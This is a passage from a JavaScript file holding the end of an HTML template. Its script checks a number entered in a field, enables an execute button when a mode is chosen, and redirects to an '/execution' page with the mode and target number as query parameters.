    const number = inputField.value.trim().replace(/\\s+/g, '');
    const selectedMode = modeSelect.value;
    executeBtn.disabled = !(isValidNumber(number) && selectedMode);
  }

  inputField.addEventListener('input', toggleButton);
  modeSelect.addEventListener('change', toggleButton);

  executeBtn.addEventListener('click', () => {
    const number = inputField.value.trim().replace(/\\s+/g, '');
    const selectedMode = modeSelect.value;
    window.location.href = '/execution?mode=' + selectedMode + '&target=' + encodeURIComponent(number);
  });

  toggleButton();
  </script>
</body>
</html>`;
};
